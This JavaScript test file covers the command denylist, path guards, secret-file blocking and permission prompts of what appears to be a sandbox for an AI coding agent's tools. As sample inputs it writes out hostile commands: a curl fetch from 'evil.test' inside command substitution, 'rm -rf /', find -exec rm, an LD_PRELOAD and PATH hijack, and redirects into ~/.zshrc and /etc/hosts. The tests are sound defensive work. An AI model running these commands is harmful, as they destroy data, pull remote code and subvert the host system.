const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const os = require('os');
const path = require('path');

const {
  denyReason,
  mergeDenylist,
  DEFAULT_DENYLIST,
  whyBlocked,
  resolveInside,
  shellMetaOutsideQuotes,
  isDangerousPath,
  isAllowed,
  DEFAULT_ALLOWLIST,
  makeTools,
  commandPrograms,
  CMD_UNSAFE,
} = require('../src/tools');

function tmpRoot() {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'hadome-test-'));
}

test('denyReason blocks known dangerous command shapes', () => {
  assert.ok(denyReason('some-command --output=/etc/passwd'));
  assert.ok(denyReason('git branch -D main'));
  assert.ok(denyReason('node -e "console.log(1)"'));
  assert.ok(denyReason('node --eval "console.log(1)"'));
  assert.ok(denyReason('node x -e "console.log(1)"'));
  assert.ok(denyReason('open -a "Google Chrome" --remote-debugging-port=9222'));
});

test('denyReason allows ordinary safe commands', () => {
  assert.equal(denyReason('git status'), null);
  assert.equal(denyReason('npm test'), null);
  assert.equal(denyReason('ls -la'), null);
});

test('mergeDenylist adds a working custom rule and keeps defaults', () => {
  const merged = mergeDenylist(['^rm\\s'], () => {});
  assert.equal(merged.length, DEFAULT_DENYLIST.length + 1);
  const hit = denyReason('rm -rf something', merged);
  assert.ok(hit);
  assert.equal(hit.key, 'tool.deny.other');
});

test('mergeDenylist silently drops non-string entries via onDropped callback', () => {
  const dropped = [];
  const merged = mergeDenylist([123, null, '^ok$'], (x) => dropped.push(x));
  assert.deepEqual(dropped, [123, null]);
  assert.equal(merged.length, DEFAULT_DENYLIST.length + 1);
});

test('isDangerousPath blocks guarded directories and files', () => {
  assert.equal(isDangerousPath('.git/config'), true);
  assert.equal(isDangerousPath('.vscode/settings.json'), true);
  assert.equal(isDangerousPath('src/.gitconfig'), true);
  assert.equal(isDangerousPath('src/index.js'), false);
});

test('whyBlocked blocks dangerous paths and secret-looking files', () => {
  const root = tmpRoot();
  assert.ok(whyBlocked(root, '.git/config'));
  assert.ok(whyBlocked(root, '.env'));
  assert.ok(whyBlocked(root, '.ssh/id_rsa'));
  assert.equal(whyBlocked(root, 'src/index.js'), null);
});

test('whyBlocked respects .bridgeignore rules', () => {
  const root = tmpRoot();
  fs.writeFileSync(path.join(root, '.bridgeignore'), 'secret-notes.md\n# comment\n');
  assert.ok(whyBlocked(root, 'secret-notes.md'));
  assert.equal(whyBlocked(root, 'public-notes.md'), null);
});

test('whyBlocked accepts a precomputed ignoreRules cache (perf fix) with identical results', () => {
  const root = tmpRoot();
  fs.writeFileSync(path.join(root, '.bridgeignore'), 'secret-notes.md\n');
  const { whyBlocked: whyBlockedFresh } = require('../src/tools');
  const withoutCache = whyBlockedFresh(root, 'secret-notes.md', { protectSecrets: true });
  const withCache = whyBlockedFresh(root, 'secret-notes.md', {
    protectSecrets: true,
    ignoreRules: [/secret-notes\.md$/],
  });
  assert.ok(withoutCache);
  assert.ok(withCache);
  assert.equal(whyBlockedFresh(root, 'ok.md', { ignoreRules: [] }), null);
});

test('resolveInside resolves a normal in-workspace path', () => {
  const root = tmpRoot();
  const resolved = resolveInside(root, 'foo/bar.txt');
  assert.equal(resolved, path.join(root, 'foo', 'bar.txt'));
});

test('resolveInside throws on ../ escape', () => {
  const root = tmpRoot();
  assert.throws(() => resolveInside(root, '../outside.txt'), /ワークスペースの外/);
});

test('resolveInside throws on empty path', () => {
  const root = tmpRoot();
  assert.throws(() => resolveInside(root, ''));
});

test('resolveInside throws when a symlink inside root points outside it', () => {
  const root = tmpRoot();
  const outside = tmpRoot();
  fs.symlinkSync(outside, path.join(root, 'link'));
  assert.throws(
    () => resolveInside(root, 'link/secret.txt'),
    /ワークスペースの外/
  );
});

test('shellMetaOutsideQuotes flags unquoted shell metacharacters', () => {
  assert.equal(shellMetaOutsideQuotes('echo hi; rm -rf /'), ';');
  assert.equal(shellMetaOutsideQuotes('echo `whoami`'), '`');
  assert.equal(shellMetaOutsideQuotes('echo "$(whoami)"'), '$');
});

test('shellMetaOutsideQuotes allows metacharacters inside single quotes', () => {
  assert.equal(shellMetaOutsideQuotes("echo 'safe; not a separator'"), null);
});

test('isAllowed matches allowlist prefixes only at word boundary', () => {
  assert.equal(isAllowed('git status', DEFAULT_ALLOWLIST), true);
  assert.equal(isAllowed('git status --short', DEFAULT_ALLOWLIST), true);
  assert.equal(isAllowed('git statuses', DEFAULT_ALLOWLIST), false);
});

const EXPLORE_CMD =
  "printf '%s\\n' '--- rules ---' && (find rules -maxdepth 2 -type f -print 2>/dev/null || true)" +
  " && printf '%s\\n' '--- source content ---'" +
  ' && for f in api/Data/*.cs api/Entities/*.cs; do [ -f "$f" ] &&' +
  " { echo \"--- $f ---\"; sed -n '1,240p' \"$f\"; }; done" +
  " && find . -maxdepth 2 -type f \\( -name '*.sln' -o -name '*.csproj' \\) -print";

const STATUS_CMD = [
  'set -o pipefail',
  "printf '%s\\n' '--- branch/status ---'",
  'git branch --show-current',
  'git status --short',
  'dotnet build api/CarInsurance.Api.csproj --no-restore',
  'command -v gh || true',
  'if command -v gh >/dev/null 2>&1; then gh auth status 2>&1 || true; fi',
].join('\n');

test('commandPrograms parses a real exploration command without flagging it unsafe', () => {
  const r = commandPrograms(EXPLORE_CMD);
  assert.equal(r.unsafe, null);
  assert.deepEqual(r.progs, ['printf', 'find', 'true', '[', 'echo', 'sed']);
  assert.equal(r.segments[0], "printf '%s\\n' '--- rules ---'");
  assert.equal(r.segments[1], 'find rules -maxdepth 2 -type f -print 2>/dev/null');

  assert.ok(r.segments.includes('[ -f "$f"  ]') || r.segments.includes('[ -f "$f" ]'));
  assert.ok(r.segments.every((s) => !/^(do|then|\{)\b/.test(s)));
});

test('commandPrograms flags the status command because it uses `command`', () => {
  const r = commandPrograms(STATUS_CMD);
  assert.equal(r.unsafe, CMD_UNSAFE.runsAnything);
  assert.ok(r.progs.includes('git'));
  assert.ok(r.progs.includes('dotnet'));
});

test('commandPrograms refuses to remember find -exec and friends', () => {
  assert.equal(commandPrograms('find . -type f -exec rm -rf {} \\;').unsafe, CMD_UNSAFE.findExec);
  assert.equal(commandPrograms('find . -delete').unsafe, CMD_UNSAFE.findExec);
  assert.equal(commandPrograms('find . -name x -print').unsafe, null);
});

test('commandPrograms refuses to remember command substitution', () => {
  assert.equal(commandPrograms('echo $(curl https://evil.test/x.sh)').unsafe, CMD_UNSAFE.substitution);
  assert.equal(commandPrograms('echo `whoami`').unsafe, CMD_UNSAFE.substitution);
  assert.equal(commandPrograms('echo "$(whoami)"').unsafe, CMD_UNSAFE.substitution);
});

test('commandPrograms refuses to remember programs that run anything', () => {
  assert.equal(commandPrograms('command -v gh || true').unsafe, CMD_UNSAFE.runsAnything);
  assert.equal(commandPrograms('git log | xargs echo').unsafe, CMD_UNSAFE.runsAnything);
  assert.equal(commandPrograms('bash -lc "ls"').unsafe, CMD_UNSAFE.runsAnything);
});

test('commandPrograms treats metacharacters inside quotes as literal text', () => {
  const r = commandPrograms("echo 'a && b'");
  assert.equal(r.unsafe, null);
  assert.deepEqual(r.progs, ['echo']);
  assert.equal(r.segments.length, 1);
});

test('commandPrograms allows discarded output but not writes outside the workspace', () => {
  assert.equal(commandPrograms('find . -maxdepth 2 -type f -print 2>/dev/null').unsafe, null);
  assert.equal(commandPrograms('git status > out.txt').unsafe, null);
  assert.equal(commandPrograms('git log >/dev/null 2>&1').unsafe, null);
  assert.equal(commandPrograms('echo x > ~/.zshrc').unsafe, CMD_UNSAFE.redirect);
  assert.equal(commandPrograms('echo x > /etc/hosts').unsafe, CMD_UNSAFE.redirect);
  assert.equal(commandPrograms('echo x > ../escape.txt').unsafe, CMD_UNSAFE.redirect);
});

test('commandPrograms refuses to remember commands with a leading assignment', () => {

  assert.equal(commandPrograms('LD_PRELOAD=/tmp/evil.so ls').unsafe, CMD_UNSAFE.assignment);
  assert.equal(commandPrograms('PATH=/tmp/evil git status').unsafe, CMD_UNSAFE.assignment);
  assert.equal(commandPrograms('git status && NODE_ENV=test npm test').unsafe, CMD_UNSAFE.assignment);
});

test('commandPrograms reports a parse failure instead of guessing', () => {
  assert.equal(commandPrograms("echo 'unclosed").unsafe, CMD_UNSAFE.parse);
  assert.equal(commandPrograms('$TOOL --version').unsafe, CMD_UNSAFE.parse);
});

test('commandPrograms segments stay matchable against the existing allowlist', () => {
  const r = commandPrograms('git status && git diff');
  assert.equal(r.unsafe, null);
  assert.deepEqual(r.segments, ['git status', 'git diff']);
  assert.ok(r.segments.every((s) => isAllowed(s, DEFAULT_ALLOWLIST)));
});

test('commandPrograms returns nothing to remember for an empty command', () => {
  const r = commandPrograms('');
  assert.deepEqual(r.segments, []);
  assert.deepEqual(r.progs, []);
  assert.equal(r.unsafe, null);
});

function gatedTools({ answer = 'no', allowlist = DEFAULT_ALLOWLIST } = {}) {
  const asks = [];
  const remembered = [];
  const tools = makeTools({
    root: tmpRoot(),
    allowlist,
    askPermission: (q) => {
      asks.push(q);
      return Promise.resolve(answer);
    },
    onAllowAlways: (x) => remembered.push(x),
  });
  return { tools, asks, remembered };
}

test('run_command runs a compound of already-allowed commands without asking', async () => {
  const { tools, asks } = gatedTools();
  await tools.run_command({ command: 'git status && git diff' });
  assert.deepEqual(asks, []);
});

test('run_command offers every program in a safe compound command and remembers them all', async () => {
  const { tools, asks, remembered } = gatedTools({ answer: 'always' });
  const r = await tools.run_command({ command: "printf 'hi\\n' && echo yo" });
  assert.equal(r.ok, true);
  assert.equal(asks.length, 1);
  assert.deepEqual(asks[0].always, ['printf', 'echo']);
  assert.deepEqual(remembered, [{ kind: 'command', detail: ['printf', 'echo'] }]);

  await tools.run_command({ command: "printf 'again\\n' && echo done" });
  assert.equal(asks.length, 1);
});

test('run_command withholds the remember button when the command cannot be parsed safely', async () => {
  const { tools, asks } = gatedTools();
  await assert.rejects(() => tools.run_command({ command: 'find . -type f -exec rm -rf {} \\;' }));
  assert.equal(asks.length, 1);
  assert.equal(asks[0].always, null);
  assert.equal(asks[0].whyKey, CMD_UNSAFE.findExec);
});

test('run_command still refuses a compound command whose segments are not all allowed', async () => {
  const { tools, asks } = gatedTools();
  await assert.rejects(() => tools.run_command({ command: 'git status && dotnet build' }));
  assert.equal(asks.length, 1);
  assert.deepEqual(asks[0].always, ['git', 'dotnet']);
});

test('makeTools().glob respects .bridgeignore across the whole scan (perf-fix regression check)', async () => {
  const root = tmpRoot();
  fs.mkdirSync(path.join(root, 'src'), { recursive: true });
  fs.writeFileSync(path.join(root, 'src', 'a.js'), '// a');
  fs.writeFileSync(path.join(root, 'src', 'b.secret.js'), '// b');
  fs.writeFileSync(path.join(root, '.bridgeignore'), '*.secret.js\n');

  const tools = makeTools({ root, allowlist: DEFAULT_ALLOWLIST });
  const r = await tools.glob({ pattern: 'src/**/*.js' });
  assert.equal(r.ok, true);
  assert.match(r.output, /a\.js/);
  assert.doesNotMatch(r.output, /b\.secret\.js/);
});

test('makeTools().search finds matches while still honoring .bridgeignore (read-order regression check)', async () => {
  const root = tmpRoot();
  fs.writeFileSync(path.join(root, 'visible.txt'), 'hello world\n');
  fs.writeFileSync(path.join(root, 'hidden.secret.txt'), 'hello world\n');
  fs.writeFileSync(path.join(root, '.bridgeignore'), '*.secret.txt\n');

  const tools = makeTools({ root, allowlist: DEFAULT_ALLOWLIST });
  const r = await tools.search({ pattern: 'hello', output_mode: 'files_with_matches' });
  assert.equal(r.ok, true);
  assert.match(r.output, /visible\.txt/);
  assert.doesNotMatch(r.output, /hidden\.secret\.txt/);
});
